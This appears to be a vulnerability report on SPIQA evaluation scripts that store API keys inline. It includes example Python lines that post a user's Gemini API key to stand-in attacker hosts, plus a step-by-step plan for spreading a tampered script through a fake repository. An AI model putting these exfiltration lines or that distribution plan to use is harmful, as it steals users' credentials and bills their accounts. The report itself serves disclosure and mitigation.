### Vulnerability List:

- Vulnerability Name: API Key Exfiltration via Malicious Evaluation Scripts
- Description:
    - An attacker can create a modified version of the evaluation scripts provided in the repository.
    - This modified script would contain malicious code designed to steal API keys.
    - The attacker distributes this modified script through channels accessible to users of the SPIQA repository (e.g., a fake repository, a forum, or compromised download links).
    - A user, intending to evaluate models as per the repository's documentation, downloads and uses the malicious script.
    - The user follows the instructions in the repository's README.md, which includes configuring API keys directly within the evaluation scripts (e.g., by modifying the `api_key=""` value in the scripts).
    - When the user executes the modified script, the malicious code is triggered.
    - This malicious code exfiltrates the API key that the user has configured in the script.
    - The exfiltrated API key is sent to a server controlled by the attacker.
- Impact:
    - High.
    - Successful exfiltration of API keys grants the attacker unauthorized access to the victim's accounts on services like Google Gemini and OpenAI.
    - This access can lead to financial charges for API usage billed to the victim's account.
    - The attacker could potentially use the stolen API keys for malicious purposes, including further attacks or data breaches using the compromised API access.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
    - None. The project currently instructs users to directly embed API keys in the scripts without any security warnings or alternative secure methods.
- Missing Mitigations:
    - API Key should not be configured directly in the scripts.
    - Implement secure API key management using environment variables or configuration files.
    - Provide clear security guidelines in the documentation, warning users about the risks of directly embedding API keys in scripts and advising against downloading scripts from untrusted sources.
    - Implement integrity checks (e.g., checksums, digital signatures) for the evaluation scripts to ensure users are using unmodified, official versions.
- Preconditions:
    - The attacker needs to be able to distribute the modified scripts to potential users.
    - Users must follow the repository's instructions and configure their API keys directly within the downloaded scripts.
    - Users must execute the modified scripts.
- Source Code Analysis:
    - Files like `/code/evals/test-c/closed_models/gemini_cot_qa_test-c_evaluation_image+caption.py` and `/code/evals/test-c/closed_models/gpt4v_cot_qa_test-c_evaluation_image+caption.py` (and many others in `/code/evals`) contain lines like:
        - `genai.configure(api_key="")` (in Gemini scripts)
        - `api_key = ""` (in GPT-4V scripts)
    - These lines are intended for users to directly input their API keys.
    - For example, in `gemini_cot_qa_test-c_evaluation_image+caption.py`:
        ```python
        genai.configure(api_key="")

        # ... rest of the script ...

        if __name__ == '__main__':

            infer_gemini(qasper_data, model)
            print(len(glob.glob(args.response_root + '/*.json')))
        ```
    - An attacker can modify these scripts to add malicious code after the `genai.configure(api_key="")` line (or `api_key = ""` line in GPT-4V scripts) to exfiltrate the API key.
    - For instance, a malicious modification in `gemini_cot_qa_test-c_evaluation_image+caption.py` could be:
        ```python
        import google.generativeai as genai
        import requests  # Import the requests library

        genai.configure(api_key="")
        api_key_to_exfiltrate = genai.api_key  # Get the configured API key
        requests.post("https://attacker-server.com/api/exfiltrate", data={'api_key': api_key_to_exfiltrate}) # Send API key to attacker's server

        # ... rest of the original script ...
        ```
    - When the user runs this modified script after setting their API key, the `requests.post` line will send the API key to `attacker-server.com`.

- Security Test Case:
    1. **Attacker Setup**:
        - Set up a simple HTTP server (e.g., using Python's `http.server` or `ngrok` for public accessibility) to receive exfiltrated data. Let's say the attacker uses `ngrok` to get a public URL: `https://attacker-server.ngrok.io`.
        - Create a modified version of `/code/evals/test-a/closed_models/gemini_qa_test-a_evaluation_image+caption.py`.
        - In the modified script, add the following lines after `genai.configure(api_key="")`:
            ```python
            import requests
            api_key_to_exfiltrate = genai.api_key
            requests.post("https://attacker-server.ngrok.io/exfiltrate", data={'api_key': api_key_to_exfiltrate})
            ```
    2. **Attacker Distribution**:
        - Upload the modified `gemini_qa_test-a_evaluation_image+caption.py` to a public GitHub repository named `malicious-spiqa-evals`.
        - Create a link to download this malicious script and share it on a forum where SPIQA users might be present, with instructions mimicking the original repository's README.
    3. **Victim Action**:
        - A user, intending to evaluate Gemini models, finds the attacker's link and, mistaking it for the official repository or a helpful resource, downloads `gemini_qa_test-a_evaluation_image+caption.py` from the attacker's repository.
        - The user follows the instructions in the `README.md` of the official SPIQA repository, which directs them to edit the evaluation script and insert their Gemini API key.
        - The user edits the downloaded `gemini_qa_test-a_evaluation_image+caption.py` and replaces `genai.configure(api_key="")` with `genai.configure(api_key="YOUR_ACTUAL_GEMINI_API_KEY")`.
        - The user executes the modified script: `python gemini_qa_test-a_evaluation_image+caption.py --response_root ./responses --image_resolution -1 --model_id gemini-1.5-pro`.
    4. **API Key Exfiltration**:
        - When the script runs, it configures the Gemini API client with the user's API key.
        - The malicious code `requests.post("https://attacker-server.ngrok.io/exfiltrate", data={'api_key': api_key_to_exfiltrate})` executes.
        - This sends a POST request to the attacker's `ngrok` URL (`https://attacker-server.ngrok.io/exfiltrate`) with the user's API key in the `data` payload.
    5. **Attacker Verification**:
        - The attacker checks their HTTP server logs or the `ngrok` interface and verifies that they have received a POST request.
        - The request body contains the `api_key` parameter, which holds the victim's Gemini API key.
        - The attacker has successfully exfiltrated the victim's API key.